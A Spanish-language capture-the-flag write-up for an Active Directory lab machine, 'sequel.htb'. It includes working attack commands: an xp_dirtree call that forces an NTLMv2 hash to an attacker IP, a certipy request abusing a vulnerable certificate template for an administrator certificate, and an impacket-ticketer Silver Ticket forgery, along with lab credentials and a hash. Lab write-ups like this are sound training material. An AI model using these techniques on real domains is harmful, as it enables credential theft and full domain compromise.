#ActiveDirectory #medium #windows 
### Ping
```python
ping -c 1 10.10.11.202
PING 10.10.11.202 (10.10.11.202) 56(84) bytes of data.
64 bytes from 10.10.11.202: icmp_seq=1 ttl=127 time=150 ms

--- 10.10.11.202 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 149.915/149.915/149.915/0.000 ms
```

### TTL 127 = Windows

### nmap
```python
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-03-29 08:37:36Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-03-29T08:39:09+00:00; +7h58m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2024-03-29T08:39:10+00:00; +7h58m59s from scanner time.
1433/tcp  open  ms-sql-s          Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.10.11.202:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2024-03-29T08:39:09+00:00; +7h58m59s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-03-29T08:32:26
|_Not valid after:  2054-03-29T08:32:26
| ms-sql-ntlm-info: 
|   10.10.11.202:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-03-29T08:39:09+00:00; +7h58m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
3269/tcp  open  globalcatLDAPssl?
|_ssl-date: 2024-03-29T08:39:10+00:00; +7h58m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49686/tcp open  msrpc             Microsoft Windows RPC
49725/tcp open  msrpc             Microsoft Windows RPC
51906/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h58m58s, deviation: 0s, median: 7h58m58s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-03-29T08:38:31
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 140.86 seconds
```

### Enumeración del puerto 53 (DOMAIN)
`dig` conseguimos una cookie que podría ser interesante
![[Pasted image 20240612120721.png]]

`dnsenum`
podemos ver lo que parece la ipv6 de la maquina
![[Pasted image 20240612120725.png]]

`Enumerating srv records`
tenemos un reconocimiento completo de kerberos y ldap lo que me hace pensar que podríamos intentar obtener un TGT mas adelante 
![[Pasted image 20240612120731.png]]

### Enumeración del puerto 88 (Kerberos)

![[Pasted image 20240612120737.png]]

### Enumeración del puerto 389 (ldap)
no obtenemos mucha información sobre el ldap
![[Pasted image 20240612120743.png]]

### Enumeración del puerto 445 (SBM)
tenemos archivos compartidos 
![[Pasted image 20240612120749.png]]

`smbmap`
smbmap nos permite ver los permisos que tenemos sobre los archivos compartidos
![[Pasted image 20240612120755.png]]

### smbmap
encontramos un directorio llamado public donde tenemos permisos de lectura y dentro tenemos un archivo pdf que podemos descargar 
![[Pasted image 20240612120801.png]]

`download`
descargamos el archivo pdf que se esta compartiendo
![[Pasted image 20240612120806.png]]

`open pdf`
el archivo pdf que conseguimos nos da información de varios usuarios y de como conectarnos a la base de datos mysql con las credenciales
![[Pasted image 20240612120812.png]]

### impacket-mssqlclient
usando `mssqlclient` de la suite de impacket podemos establecer conexión en la base de datos
![[Pasted image 20240612120821.png]]

### responder 
vamos a iniciar el responder para intentar obtener un hash. si intentamos listar los archivos y directorios en nuestra maquina y estos no existen la base de datos debería de darnos un hash
```python
EXEC MASTER.sys.xp_dirtree '\\10.10.10.10\test', 1, 1
```

![[Pasted image 20240612120831.png]]

### impacket-mssqlclient + responder
apuntamos a un recurso que no existe en nuestra maquina atacante por lo cual estaríamos envenenando la petición y de esta manera podeos capturar un hash NTLMv2. del usuario sql_svc
`NOTA: este ataque es parecido a un ataque SMB-Relay (SAMBA Relay)`
![[Pasted image 20240612120838.png]]

`john`
usaremos john para poder desencriptar este hash
![[Pasted image 20240612120843.png]]

### crackmapexec
validamos las credenciales por smb y por evil-winrm
![[Pasted image 20240612120847.png]]

### Evil-winrm
obtenemos conexión
![[Pasted image 20240612120852.png]]

### Lateral Movement

tenemos un usuario llamado Ryan.Cooper probablemente debemos hacer movimiento lateral para poder cambiar de usuario
![[Pasted image 20240612120900.png]]

`ERRORLOG.BAK` tenemos un archivo donde se guardan logs del sistema
![[Pasted image 20240612120914.png]]

`ERRORLOG.BAK`
parece que el usuario ryam cometió el error de poner su contraseña en el parámetro de usuario y esto ha quedado guardad en el archivo de logs
![[Pasted image 20240612120920.png]]

### crackmapexec
validamos las credenciales que hemos conseguido
![[Pasted image 20240612120925.png]]

### Lateral Movement (Usuario ryam.cooper)
logramos cambiar de usuario exitosamente. ahora solo nos queda escalar privilegios
![[Pasted image 20240612120931.png]]

### Certify
en este punto podemos utilizar la herramienta certify para intentar buscar algún certificado vulnerable y de esta manera poder escalar privilegios descargaremos la herramienta desde esta ubicación [Certify](https://github.com/ademkanat/Certify.git) 
![[Pasted image 20240612120936.png]]

`.\Certifi.exe cas`
![[Pasted image 20240612120942.png]]
`podemos ver un Certificate Authorities`
![[Pasted image 20240612120947.png]]

`.\Certify.exe find /vulnerable`
esto nos permite identificar las plantillas vulnerables. esta vulnerabilidad se puede explotar usando la herramienta certipy
![[Pasted image 20240612120955.png]]

### certipy-ad

Con este comando vamos a generar una solicitud de certificado para el usuario "ryan.cooper", con el objetivo de solicitar un certificado UPN "administrator", y utilizando la plantilla "UserAuthentication". dentro del Active Directory, y la CA utilizada para firmar el certificado es "sequel-dc-ca".
```python
certipy-ad req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication
```

![[Pasted image 20240612121012.png]]

`Ahora que tenemos un certificado de administrador, podemos usar certipy para obtener un Ticket Granting Ticket (TGT) y extraer el hash NTLMv2 para este usuario. Dado que este paso requiere cierta interacción con Kerberos, necesitamos sincronizar nuestro reloj con la hora de la máquina remota antes de poder continuar.`
```python
sudo ntpdate -u dc.sequel.htb # con este comando sincronizamos nuestro reloj con el DC (Domain Controller)

certipy auth -pfx administrator.pfx # con este comando generamos el certificado 
```

de este manera obtenemos un hash del usuario administrador el cual podemos usar para la autenticación
![[Pasted image 20240612121025.png]]

### evil-winrm
obtenemos conexión con el usuario administrator
![[Pasted image 20240612121029.png]]

### WE ARE ROOT

### SOLUCIÓN ALTERNATIVA
vamos a solicitar el SID de algún usuario en la maquina para ello usaremos
```python
Get-LocalUser -Name $env:USERNAME | Select sid
```

![[Pasted image 20240612121038.png]]

`Usamos el SID que hemos conceguido para obtener un NTLM hash`
![[Pasted image 20240612121043.png]]

### MSSQL service
ahora vamos a craftear un  `Silver Ticket attack` El parámetro `SPN` es necesario para generar un ticket válido, pero podemos colocar lo que queramos ya que, no está configurado.

```python
impacket-ticketer -nthash 1443EC19DA4DAC4FFC953BCA1B57B4CF -domain-sid S-1-5-21-
4078382237-1492182817-2568127209 -domain sequel.htb -dc-ip dc.sequel.htb -spn
nonexistent/DC.SEQUEL.HTB Administrator
```

### TSA

![[Pasted image 20240612121051.png]]

![[Pasted image 20240612121109.png]]

### WE ARE ROOT